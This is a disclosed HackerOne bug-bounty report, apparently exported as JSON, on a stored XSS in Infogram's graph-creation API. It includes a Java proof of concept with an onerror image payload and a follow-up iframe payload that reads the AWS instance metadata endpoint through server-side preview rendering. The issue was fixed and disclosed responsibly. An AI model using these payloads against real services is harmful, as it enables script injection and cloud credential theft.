{"id":287562,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODc1NjI=","url":"https://hackerone.com/reports/287562","title":"Stored XSS in content when Graph is created via API","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-11-05T13:35:29.891Z","submitted_at":"2017-11-05T13:35:29.891Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"krankopwnz","url":"/krankopwnz","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21745,"url":"https://hackerone.com/infogram","handle":"infogram","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Infogram","twitter_handle":"infogram","website":"http://infogram.com","about":"Make Infographics and Charts that People Love"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-07T09:32:34.044Z","bug_reporter_agreed_on_going_public_at":"2017-11-06T16:34:39.269Z","team_member_agreed_on_going_public_at":"2017-11-07T09:32:33.954Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Summary\nIt is possible for an attacker to insert javascript code into Graphs by creating a project via the API\n\n#Steps to reproduce\nLogin\nGo to [API Settings](https://infogram.com/app/#settings/api)\nCopy your Key + Secret\nGo to [API Documentation](https://developers.infogr.am/rest/)\nDownload one of the official libraries ( I chose JAVA )\nIn the \"main\" method add the Key + Secret you copied previously\nAdd a new parameter \"content\" with the following content:\n\n`[{\\\"type\\\":\\\"h1\\\",\\\"text\\\":\\\"asd\u003e\\\\\\\"'\u003cimg src=a onerror=alert(document.domain)\u003e\\\"}]`\n\nAdd all the other required parameters\nMy main method looks like this:\n```\npublic static void main(String[] args) {\n        InfogramAPI infogram = new InfogramAPI([API-Key], [API-Secret]);\n\n        Map\u003cString, String\u003e parameters = new HashMap\u003cString, String\u003e();\n\n        //parameters = null;\n\n        parameters.put(\"content\", \"[{\\\"type\\\":\\\"h1\\\",\\\"text\\\":\\\"asd\u003e\\\\\\\"'\u003cimg src=a onerror=alert(document.domain)\u003e\\\"}]\");\n        parameters.put(\"theme_id\", \"7291\");\n        parameters.put(\"title\",\"title\");\n        parameters.put(\"publish\", \"true\");\n        parameters.put(\"publish_mode\", \"public\");\n        \n        try {\n            Response response = infogram.sendRequest(\"POST\", \"infographics\", parameters);\n\n            if (response.isSuccessful()) {\n                InputStream is = response.getResponseBody();\n                System.out.print(getStringFromInputStream(is).replace(\",\", \",\\n\"));\n                \n            } else {\n                String errmsg = String.format(\"The server returned %d %s\", response.getHttpStatusCode(), response.getHttpStatusMessage());\n                System.err.println(errmsg);\n            }\n        } catch (IOException e) {\n            System.err.println(\"There was a problem connecting to the server\");\n            e.printStackTrace();\n        }\n    }\n```\n\nYou will get a 201 response which indicates that the Graph has been successfully created\nNow go to your [Dashboard](https://infogram.com/app/#/library)\nOpen the newly created project\nA Javascript popup showing the current domain appears\n\n{F236727}\n\n#Remediation\nHTML encode all parameter values before reflecting them on the page","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":236727,"file_name":"storedXSS-api.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/727/304460e190c7d0a7360772dddc224cd148fee7dd/storedXSS-api.PNG?response-content-disposition=attachment%3B%20filename%3D%22storedXSS-api.PNG%22%3B%20filename%2A%3DUTF-8%27%27storedXSS-api.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143843Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f72bb1c239e019155972b5a33415f4615bf770e1333168320aec4b4531b6b6ae","file_size":29376,"type":"image/png"}],"allow_singular_disclosure_at":"2017-12-06T16:34:39.366Z","allow_singular_disclosure_after":-121385043.82586181,"singular_disclosure_allowed":true,"vote_count":6,"voters":["0xsaltyhashes","sp1d3rs","eveeez","krankopwnz","khizer47","b4155f7c29acd42c27d007a"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":870,"asset_type":"URL","asset_identifier":"infogram.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2135479,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I just discovered that it is also possible to make requests to the internal network ( or at least the AWS instance where the rendering of the preview images is made ).\n\nFor that you have to include an iframe with the src of the AWS Metadata URL, so you have to replace the content parameter from the previous post with the following:\n\n`parameters.put(\"content\", \"[{\\\"type\\\":\\\"h1\\\",\\\"text\\\":\\\"asd\u003e\\\\\\\"'\u003ciframe src=http://169.254.169.254/latest/meta-data/\u003e\u003c/iframe\u003e\\\"}]\");`\n\nand create a new infographic via the API with that\nWhen you now go to the [Dashboard](https://infogram.com/app/#/library) you see the disclosed data in the preview picture of your project:\n\n{F236730}\n\nI did not test this further as I do not want to touch sensitive data, but this can potentially used to get AWS credentials of the services you are running ( depends on the permissions of the user the request is made with )","automated_response":false,"created_at":"2017-11-05T13:49:25.810Z","updated_at":"2017-11-05T13:58:50.317Z","actor":{"username":"krankopwnz","cleared":false,"url":"/krankopwnz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":236730,"filename":"AWS.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/730/7852f473594235d9ccd09422df168b78dd5aee25/AWS.jpg?response-content-disposition=attachment%3B%20filename%3D%22AWS.jpg%22%3B%20filename%2A%3DUTF-8%27%27AWS.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143843Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2a670f552d0bd8307d7c0d3a9d55fcce2ed498c0e5beb779d2cc0c8dc41e58e6"}],"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2136370,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2017-11-06T08:59:13.406Z","updated_at":"2017-11-06T08:59:13.406Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2136642,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, it should be fixed now.\n\nBest regards,\nKaspars","automated_response":false,"created_at":"2017-11-06T11:07:05.425Z","updated_at":"2017-11-06T11:07:05.425Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"krankopwnz","url":"/krankopwnz"},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2137378,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Looks fixed for me, thank you","automated_response":false,"created_at":"2017-11-06T16:34:39.310Z","updated_at":"2017-11-06T16:34:39.310Z","first_to_agree":true,"actor":{"username":"krankopwnz","cleared":false,"url":"/krankopwnz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2139482,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-11-07T09:32:33.998Z","updated_at":"2017-11-07T09:32:33.998Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2139483,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-11-07T09:32:34.077Z","updated_at":"2017-11-07T09:32:34.077Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}